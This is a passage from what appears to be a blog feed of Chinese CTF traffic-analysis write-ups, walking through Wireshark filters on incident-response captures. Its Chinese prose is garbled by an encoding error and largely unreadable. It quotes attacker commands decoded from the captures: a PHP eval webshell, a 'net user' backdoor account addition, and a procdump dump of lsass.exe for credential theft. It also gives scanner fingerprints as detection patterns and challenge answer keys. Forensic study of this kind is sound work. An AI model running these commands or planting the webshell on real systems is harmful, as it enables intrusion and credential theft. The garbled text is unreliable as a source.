·ï¼Œæ˜æ˜¾ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„ä»£ç†ipä¸º<code>4.2.2.2</code><br><a href="https://imgchr.com/i/iCEBSU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEBSU.md.png" alt="iCEBSU.md.png"></a></p><p>ç„¶åç¬¬äº”åˆ°ç¬¬å…«ä¸ªåŒ…æ²¡æœ‰ä»»ä½•æœ‰å…³é¢˜ç›®çš„ç­”æ¡ˆ</p><p>è¿‡æ»¤ç¬¬ä¹ä¸ªåŒ…çš„å†…å®¹<br><code>(ip.addr == 202.1.1.2) and (http contains &quot;ls&quot;|| http contains &quot;dir&quot;)</code><br>å‘ç°æœ‰ä¸¤æ¬¡åˆ—ç›®å½•çš„è¿‡ç¨‹<br><a href="https://imgchr.com/i/iCEXff" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEXff.md.png" alt="iCEXff.md.png"></a></p><p>ç”¨äº†<code>dir</code>çš„é‚£ä¸€æ¬¡æ‰æœ‰å›æ˜¾ï¼Œç³»ç»Ÿæ˜¯<code>Windows</code>æ²¡é”™äº†<br><a href="https://imgchr.com/i/iCEz6g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEz6g.md.png" alt="iCEz6g.md.png"></a><br>æ—¶é—´å¾ˆæ˜æ˜¾å°±æ˜¯è¿™ä¸ªäº†<br>æˆ‘ä¹ˆç°åœ¨çŸ¥é“é»‘å®¢æ”»å‡»çš„ipæ˜¯<code>192.168.2.20</code>ï¼Œç„¶åè¿‡æ»¤ä¸€ä¸‹<code>ip.addr == 192.168.2.20 &amp;&amp; http</code><br><a href="https://imgchr.com/i/iCVSXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVSXQ.md.png" alt="iCVSXQ.md.png"></a><br>å‘ç°é»‘å®¢é€šè¿‡echoå‘½ä»¤å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åé€šè¿‡<code>sh.php</code>æ‰§è¡Œ<br>å†è¿‡æ»¤ä¸€ä¸‹<br><code>ip.src == 192.168.2.20 &amp;&amp; http</code><br>å‘ç°åœ¨<code>18:49:27.767754</code>å‘ç°äº†ç–‘ä¼¼é»‘å®¢æŒ¯å…´<code>net user localgroup</code> å‘½ä»¤çš„ç»“æœ<br><a href="https://imgchr.com/i/iCVC0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVC0s.md.png" alt="iCVC0s.md.png"></a><br>æ ‡è®°ä¸€ä¸‹åœ¨å…¶é™„è¿‘æ‰¾è¯·æ±‚</p><p>æœä¸å…¶ç„¶<br>åœ¨ä»–çš„ä¸‹æ–¹çš„postè¯·æ±‚é‡Œé¢çš„<code>z2</code>å‚æ•°é‡Œé¢è§£ç å¾—åˆ°<br><a href="https://imgchr.com/i/iCVFkq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVFkq.md.png" alt="iCVFkq.md.png"></a></p><p><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</code><br>ä¹Ÿå°±æ˜¯å¢åŠ äº†<code>kaka:kaka</code>è¿™ä¸ªç”¨æˆ·åå’Œå¯†ç </p><p>æœ€åä¸€ä¸ªé—®é¢˜æ˜¯ä¸‹è½½äº†ä»€ä¹ˆæ–‡ä»¶ï¼Œç”±äºä½¿ç”¨èœåˆ€ä¸‹è½½çš„ï¼Œå¾ˆç®€å•ç›´æ¥è¿‡æ»¤postè¯·æ±‚å°±å¥½<br><code>ip.dst == 192.168.2.20 &amp;&amp; http.request.method== &quot;POST&quot;</code><br><a href="https://imgchr.com/i/iCVecF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVecF.md.png" alt="iCVecF.md.png"></a></p><p>åœ¨è¿™ä¸ªåŒ…é‡Œé¢ä¼šå‘ç°æœ€åæœ‰å‡ ä¸ªæŠ¥æ–‡æ˜¯å«æœ‰z2å‚æ•°çš„ï¼Œååˆ†å¯ç–‘ï¼Œè§£ç <br>ä¼šå‘ç°å“Ÿä¸€ä¸ªåˆ©ç”¨<code>procdump.exe</code>æ“ä½œçš„ä¸œè¥¿<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lspasss.dmp&amp;echo [S]&amp;cd&amp;echo [E]</code><br>ä¸‹é¢çš„postè¯·æ±‚è§£ç z2å‚æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„ä¸œè¥¿<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]</code><br>å†æ¥è§£ç ä¸€ä¸‹æœ€åä¸€ä¸ªæŠ¥æ–‡é‡Œé¢çš„ä¸œè¥¿ï¼Œå‘ç°è¿™ä¸ªæ–‡ä»¶<br><code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code><br>çŒœæµ‹åº”è¯¥æ˜¯ä¸‹äº†è¿™ä¸ªæ–‡ä»¶<br>ç„¶åæ‰“å¼€ç¬¬10ä¸ªæŠ¥æ–‡ç¡®è®¤å°±æ˜¯è¿™ä¸ªæ–‡ä»¶å°±å¥½äº†</p><p>ç­”æ¡ˆå½’çº³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.192.168.1.8</span><br><span class="line">2.list[select]</span><br><span class="line">3.ajtuc</span><br><span class="line">4.joomla</span><br><span class="line">5.$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe(æœªè§£å¯†)</span><br><span class="line">6.zzz</span><br><span class="line">7.17:20:44.248365</span><br><span class="line">8.Referer</span><br><span class="line">9.admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</span><br><span class="line">10.4.2.2.2</span><br><span class="line">11.18:49:27.767754</span><br><span class="line">12.kaka:kaka</span><br><span class="line">13.lsass.exe_180208_185247.dmp</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>1.å‘ç°æœ‰èœåˆ€æµé‡çš„æ—¶å€™å¤šå…³æ³¨æ˜¯å¦å‡ºç°z2å‚æ•°çš„å€¼ï¼Œå‡¡æ˜¯å‡ºç°è¿™ç§å‚æ•°çš„å€¼å¾—å¤šå»è§£ç çœ‹çœ‹ï¼Œä¸è¦å«Œéº»çƒ¦ï¼Œå› ä¸ºè¿™é‡Œé¢å¾€å¾€åŒ…å«ä¸€äº›å…³é”®æ“ä½œ<br>2.å‡ºç°ä¸€äº›æœ‰å…³phpæ··æ·†çš„ä»£ç çš„æ—¶å€™è¦å­¦ä¼šæ‰¾åˆ°å¯¹åº”çš„å‚æ•°å»åæ··æ·†2333</p>]]></content>
      
      <categories>
          
          <category> æµé‡åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’8æœˆåº”æ€¥å“åº”é¢˜ç›®å›é¡¾</title>
      <link href="/anheng-8month-part1.html"/>
      <url>/anheng-8month-part1.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€åšæµé‡åˆ†æçš„é¢˜ç›®æ„Ÿè§‰è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œæ‰€ä»¥æœ€è¿‘å‡ ç¯‡åšå®¢éƒ½åº”è¯¥éƒ½æ˜¯ç»ƒä¹ æµé‡åˆ†æçš„é¢˜ç›®äº†ï¼Œå°±ä»å®‰æ’8æœˆèµ›è¿™ä¸ªåº”æ€¥å“åº”è®²èµ·å§ï¼Œè®°å½•ä¸€ä¸‹åŠ æ·±å°è±¡ï¼Œé¡ºä¾¿å°ç»“ä¸€ä¸‹è‡ªå·±çš„åšé¢˜é¢†æ‚Ÿã€‚<a id="more"></a></p><p>é¢˜ç›®åœ°å€  <a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" target="_blank" rel="noopener">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="é¢˜ç›®æ¦‚è¿°"><a href="#é¢˜ç›®æ¦‚è¿°" class="headerlink" title="é¢˜ç›®æ¦‚è¿°"></a>é¢˜ç›®æ¦‚è¿°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1ã€ç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨</span><br><span class="line">2ã€å¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯(ç›¸å¯¹è·¯å¾„å³å¯) /admin/login.php</span><br><span class="line">3ã€å¾—åˆ°é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·å¯†ç ç™»é™†äº†webåå°(å½¢å¼:username/password)</span><br><span class="line">4ã€å¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ,æäº¤webshellå†…å®¹çš„baseç¼–ç </span><br><span class="line">5ã€é»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ</span><br><span class="line">6ã€é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘</span><br><span class="line">7ã€é»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_codeæ˜¯ä»€ä¹ˆ</span><br><span class="line">8ã€é»‘å®¢ç ´è§£äº†è´¦å·ijnu@test.comå¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ</span><br><span class="line">9ã€è¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip</span><br><span class="line">10ã€é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼: username/passwordï¼‰</span><br><span class="line">11ã€é»‘å®¢è·å¾—çš„vpn,ipæ˜¯å¤šå°‘</span><br></pre></td></tr></table></figure><p>è¿˜å¾—äº†è§£ä¸€ä¸‹ä¸€äº›å‰ç½®çš„çŸ¥è¯†</p><p>è¿‡æ»¤IPï¼Œå¦‚æºIPæˆ–è€…ç›®æ ‡ x.x.x.x<br><code>ip.src == x.x.x.x or ip.dst eq x.x.x.x æˆ–è€… ip.addr == x.x.x.x</code><br>è¿‡æ»¤ç«¯å£<br><code>tcp.port eq 80 or udp.port eq 80</code><br>è¿‡æ»¤MAC<br><code>eth.dst ==A0:00:00:04:C5:84</code></p><p>httpæ¨¡å¼è¿‡æ»¤(å°±æ˜¯ä¸€ç§æ¨¡ç³ŠåŒ¹é…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.request.method== &quot;GET&quot; </span><br><span class="line">http.request.method== &quot;POST&quot; </span><br><span class="line">http.request.uri ==&quot;/img/logo-edu.gif&quot; </span><br><span class="line">http contains&quot;GET&quot; </span><br><span class="line">http contains&quot;HTTP/1.&quot; </span><br><span class="line">http.request.method== &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br></pre></td></tr></table></figure><p>ä¸€äº›å¸¸è§çš„è‡ªåŠ¨åŒ–å·¥å…·çš„æŒ‡çº¹</p><p>Awvsï¼ˆAcunetix Web Vulnerability Scanner ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_test acunetix </span><br><span class="line">acunetix_wvs acunetix_test</span><br><span class="line">Acunetix-Aspect-Password: Cookie: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-Host: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-For: </span><br><span class="line">acunetix_wvs_security_test Host: </span><br><span class="line">acunetix_wvs_security_test</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰æˆ‘ä»¬åªéœ€è¦http contains â€œwvsâ€ æˆ–è€…æ˜¯ http contains â€œacunetixâ€å°±å¯ä»¥æŠŠåŒ…ç»™ç­›é€‰å‡ºæ¥</p><p>Netsparker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Scanner: NetsparkerLocation: </span><br><span class="line">NetsparkerAccept: netsparker/checkCookie: </span><br><span class="line">netsparkerCookie: NETSPARKER</span><br></pre></td></tr></table></figure><p>Appscan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Headers Content-Type: Appscan </span><br><span class="line">Content-Type: AppScanHeaderAccept: Appscan User-Agent:Appscan</span><br></pre></td></tr></table></figure><p>Nessus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure><p>Sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: sqlmap1.2.8#stable</span><br></pre></td></tr></table></figure><h4 id="1ã€ç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨"><a href="#1ã€ç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨" class="headerlink" title="1ã€ç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨"></a>1ã€ç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨</h4><p>ç«Ÿç„¶æ˜¯é»‘å®¢æ”»å‡»ï¼Œå°±åº”è¯¥æŠŠæŠŠhttpè¿‡æ»¤çœ‹ä¸€ä¸‹æˆ–è€…ç›´æ¥æœå°±è¡Œ<br><a href="https://imgchr.com/i/Pj0s39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0s39.md.png" alt="Pj0s39.md.png"></a><br>æ‰€ä»¥è¿™ä¸€é¢˜çš„ç­”æ¡ˆæ˜¯awvs</p><h4 id="2ã€å¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯-ç›¸å¯¹è·¯å¾„å³å¯-admin-login-php"><a href="#2ã€å¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯-ç›¸å¯¹è·¯å¾„å³å¯-admin-login-php" class="headerlink" title="2ã€å¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯(ç›¸å¯¹è·¯å¾„å³å¯) /admin/login.php"></a>2ã€å¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯(ç›¸å¯¹è·¯å¾„å³å¯) /admin/login.php</h4><p>é€šå¸¸åå°çš„åå­—åŒ…æ‹¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">login</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥æœå…¶ä¸­çš„ä¸€ä¸ªè¾“å…¥å‘½ä»¤<code>http contains &quot;login&quot; &amp;&amp; http.request.method == &quot;POST&quot;</code><br><a href="https://imgchr.com/i/Pj0ycR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0ycR.md.png" alt="Pj0ycR.md.png"></a><br>å‰é¢çš„éƒ½æ˜¯ç™»é™†çš„é¡µé¢ï¼Œé‚£ä¸ªpassword_resetåº”è¯¥æ˜¯å¯†ç é‡ç½®<br>æ‰€ä»¥è¿™ä¸€é¢˜çš„ç­”æ¡ˆåº”è¯¥æ˜¯<code>/admin/login.php?rec=login</code></p><p>###3ã€å¾—åˆ°é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·å¯†ç ç™»é™†äº†webåå°(å½¢å¼:username/password)<br>ä¹Ÿæ˜¯åŒæ ·çš„å¥—è·¯<br>è¾“å…¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p><p> è¿™ä¸ªæˆ‘æ‰¾å¾—æœ‰ç‚¹ä¹…ï¼Œå› ä¸ºç­”æ¡ˆåœ¨æœ€åï¼Œä¸­é—´è¿˜æœ‰å…¶ä»–å¯ä»¥ç™»é™†ä¸Šå»çš„ç”¨æˆ·æœ‰ä¸€ä¸ªè¿˜åƒæ˜¯äººäº‹ï¼Œè¿˜æœ‰ä¸¤å¤–ä¸€ä¸ªå¥½åƒæ˜¯è®¾ä¹ˆsimpleå•¥çš„ï¼Œçœ‹äº†è¿™æ•´ä¸ªåŒ…ï¼Œå‘ç°simpleè¿™ä¸ªè´¦å·æœ‰å¥½å‡ æ¬¡æ”¹å¯†ç çš„æ“ä½œï¼Œäººäº‹ä¹Ÿç™»é™†äº†å‡ æ¬¡ï¼Œè¿™äº›æ··æ·†éƒ½ç»™è¿™é¢˜æé«˜éš¾åº¦ï¼Œå¦‚æœä½ çœŸçš„ä»”ç»†åˆ†æè¿™ä¸ªåŒ…çš„è¯å°±ä¼šå‘ç°ï¼Œè¿™é‡Œé¢é»‘å®¢æ˜¯å¤§æ¦‚çˆ†ç ´äº†å‡ æ¬¡ï¼Œä¸­é—´è¿˜å°è¯•äº†ä¸€æ³¢SQLæ³¨å…¥ï¼Œè€Œä¸”çˆ†ç ´çš„è¿‡ç¨‹éƒ½æ˜¯ç”¨çš„adminè´¦æˆ·ï¼Œè¿™ä¹Ÿæš—ç¤ºäº†ä¸ºä»€ä¹ˆæœ€åçš„ç™»é™†çš„ç”¨æˆ·åæ˜¯adminäº†ï¼Œè¿™é‡Œçš„è¯ç™»é™†æˆåŠŸå¯ä»¥çœ‹é•¿åº¦ï¼Œå¯¹æ¯”çˆ†ç ´è·Ÿæ­£å¸¸äººäº‹çš„ç™»å½•ï¼ŒæˆåŠŸçš„è¯ä¸€èˆ¬é•¿åº¦éƒ½æ˜¯750+ï¼Œæ²¡æˆåŠŸçš„è¯ä¸€èˆ¬éƒ½æ˜¯730+<br><a href="https://imgchr.com/i/Pj06j1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj06j1.md.png" alt="Pj06j1.md.png"></a><br>æ‰€ä»¥ç¬¬ä¸‰é¢˜çš„ç­”æ¡ˆæ˜¯<code>admin/admin!@#pass123</code></p><h4 id="4ã€å¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ-æäº¤webshellå†…å®¹çš„baseç¼–ç "><a href="#4ã€å¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ-æäº¤webshellå†…å®¹çš„baseç¼–ç " class="headerlink" title="4ã€å¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ,æäº¤webshellå†…å®¹çš„baseç¼–ç "></a>4ã€å¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ,æäº¤webshellå†…å®¹çš„baseç¼–ç </h4><p>é€šå¸¸webshelléƒ½ä¼šæœ‰æ˜æ˜¾çš„å…³é”®å­—æ¯”å¦‚evalã€assertä¹‹ç±»çš„ï¼Œè¿˜æœ‰å„ç§å›è°ƒå‡½æ•°å°±ä¸å¤šè¯´äº†ã€‚<br>æˆ‘ä»¬è¿™é‡Œä¹Ÿæ˜¯ä¸€æ ·çš„å¥—è·¯<br><code>ip.src == 192.168.94.59 and http contains &quot;eval&quot;</code> ä¸€çœ‹è¿™ä¸å¤ªæ­£å¸¸çš„æ–‡ä»¶åï¼Œæœ‰å¾ˆå¤§æœºä¼šå°±æ˜¯webshelläº†ï¼Œè€Œä¸”é‡Œé¢çš„å†…å®¹å«æœ‰z1è¿™æ ·çš„å‚æ•°å¾ˆå¤§å¯èƒ½æ€§å°±æ˜¯èœåˆ€è¿æ¥çš„æµé‡ï¼Œæ‰€ä»¥æ–‡ä»¶åæ˜¯<code>/image/article/a.php</code><br><a href="https://imgchr.com/i/Pj02B6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj02B6.md.png" alt="Pj02B6.md.png"></a></p><p>æ‰€ä»¥è¿™é¢˜çš„ç­”æ¡ˆæ˜¯<br><code>&lt;?php @eval([1234]);?&gt;</code>çš„base64ç¼–ç </p><h4 id="5ã€é»‘å®¢åœ¨robots-txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ"><a href="#5ã€é»‘å®¢åœ¨robots-txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ" class="headerlink" title="5ã€é»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ"></a>5ã€é»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ</h4><p>æ­£å¸¸æ“ä½œ<code>http contains &quot;robots.txt&quot;</code>ç„¶åè¿½è¸ªæµå°±å¥½äº†<br><a href="https://imgchr.com/i/Pj0I9H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0I9H.md.png" alt="Pj0I9H.md.png"></a><br>è¿™é¢˜çš„ç­”æ¡ˆå°±æ˜¯ä¸Šå›¾çš„flag</p><h4 id="6ã€é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘"><a href="#6ã€é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘" class="headerlink" title="6ã€é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘"></a>6ã€é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘</h4><p>å¯¹äºè¿™é¢˜çš„æ•°æ®åº“æ“ä½œï¼Œå…ˆæŠŠé©¬ç»™è¿‡æ»¤å‡ºæ¥ï¼Œç„¶åå†ä»é‡Œé¢æ‰¾ä»–çš„responseï¼Œå› ä¸ºè¿™é‡Œé»‘å®¢æ˜¯é€šè¿‡é©¬å¯¹æ•°æ®åº“æ“ä½œçš„<br>å¯ä»¥å…ˆæ ‡è®°ä¸€ä¸‹<code>a.php</code>ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œç„¶åè¿‡æ»¤httpä¸€æ¡æ¡å»çœ‹ä»–ä»¬çš„responseå°±å¯ä»¥äº†ï¼Œè¦æ˜¯æƒ³è¯¦ç»†ä¸€ç‚¹çš„è¯å¯ä»¥åŠ ä¸Šdbç­‰å­—æ ·ï¼Œè¿™å°±æ˜¯åšé¢˜æ—¶å€™çš„ä¸€äº›å°æŠ€å·§äº†ã€‚ã€‚å¯èƒ½æ°å¥½ä¸€æ ·çš„æ•ˆç‡æœ‰ç‚¹ä½<br><a href="https://imgchr.com/i/Pj0XE8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0XE8.md.png" alt="Pj0XE8.md.png"></a><br>æ‰€ä»¥è¿™é¢˜çš„ç­”æ¡ˆå°±æ˜¯<code>e667jUPvJjXHvEUv</code></p><h4 id="7ã€é»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash-codeæ˜¯ä»€ä¹ˆ"><a href="#7ã€é»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash-codeæ˜¯ä»€ä¹ˆ" class="headerlink" title="7ã€é»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_codeæ˜¯ä»€ä¹ˆ"></a>7ã€é»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_codeæ˜¯ä»€ä¹ˆ</h4><p>è¿™ä¸ªé¢˜ç›®æ˜æ˜¾çš„å°±æ˜¯è¯´åœ¨æ•°æ®åº“é‡Œé¢æ‰¾åˆ°çš„hash_codeï¼Œä½†æ˜¯åœ¨ç¬¬ä¸€ä¸ªåŒ…é‡Œé¢ä½¿ç”¨<code>http contains &quot;hsah_code&quot;</code>åªæ‰¾åˆ°ä¸€ä¸ªå“åº”æŠ¥æ–‡ï¼Œé‡Œé¢ä»€ä¹ˆéƒ½æ‰¾ä¸åˆ°ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åˆ«å¿˜äº†æœ‰ç¬¬äºŒä¸ªåŒ…çš„å­˜åœ¨ï¼Œæˆ‘å°±æ˜¯ç»å¸¸å¿˜äº†ã€‚ã€‚è¿™ç§åšé¢˜ä¹ æƒ¯å¾—æ”¹æ”¹ï¼Œå¤ªæµ®èºï¼Œä¸€æ—¦å‘ç°æ²¡æœ‰å°±ä¸åšäº†ã€‚ã€‚ã€‚<br>æˆ‘ä»¬æ¥å¯¹æ¯”ä¸€ä¸‹ä¸¤ä¸ªåŒ…çš„åè®®åˆ†çº§ï¼Œå¾ˆæ˜æ˜¾ç¬¬äºŒåŒ…é‡Œé¢å¤§å¤šæ•°éƒ½æ˜¯mysqlçš„æ“ä½œï¼Œæ‰€ä»¥å¾ˆå¤§å¯èƒ½æ€§å°±æ˜¯è¿™ä¸ªåŒ…é‡Œé¢å­˜åœ¨æˆ‘ä»¬è¦çš„ç­”æ¡ˆ<br>ç¬¬ä¸€ä¸ªåŒ…åº”ç”¨å±‚å¤§éƒ¨åˆ†éƒ½æ˜¯htmlçš„å“åº”<br><a href="https://imgchr.com/i/PjBpgs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBpgs.md.png" alt="PjBpgs.md.png"></a><br>è€Œç¬¬äºŒä¸ªåŒ…æ˜æ˜¾äº†ï¼Œç›´æ¥åœ¨tcpåè®®ä¸Šæ‰§è¡Œçš„Mysqlæ“ä½œ<br><a href="https://imgchr.com/i/PjB9vn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB9vn.md.png" alt="PjB9vn.md.png"></a><br>æˆ‘ä»¬å¯ä»¥åœ¨ç¬¬äºŒä¸ªåŒ…é‡Œé¢ç”¨mysqlçš„è¿‡æ»¤ï¼Œå¦‚æœæ˜¯æƒ³æœç´¢æ‰§è¡Œè¯­å¥çš„è¯æœ€å¥½è¿™æ ·å­ï¼Œå¦‚ï¼šmysql.query contains â€œSELECTâ€<br>ç±»ä¼¼çš„æ¨¡ç³ŠåŒ¹é…<br><code>mysql contains &quot;hash_code&quot;</code><br>ç„¶åéšä¾¿æ‰¾ä¸ªresponseè¿½è¸ªæµçœ‹ä¸€ä¸‹ï¼Œå‘ç°ç­”æ¡ˆ<br><a href="https://imgchr.com/i/PjBiD0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBiD0.md.png" alt="PjBiD0.md.png"></a><br>è¿™é¢˜ç­”æ¡ˆæ˜¯<code>d1c029893df40cb0f47bcf8f1c3c17ac</code></p><h4 id="8ã€é»‘å®¢ç ´è§£äº†è´¦å·ijnu-test-comå¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ"><a href="#8ã€é»‘å®¢ç ´è§£äº†è´¦å·ijnu-test-comå¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ" class="headerlink" title="8ã€é»‘å®¢ç ´è§£äº†è´¦å·ijnu@test.comå¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ"></a>8ã€é»‘å®¢ç ´è§£äº†è´¦å·<a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a>å¾—åˆ°çš„å¯†ç 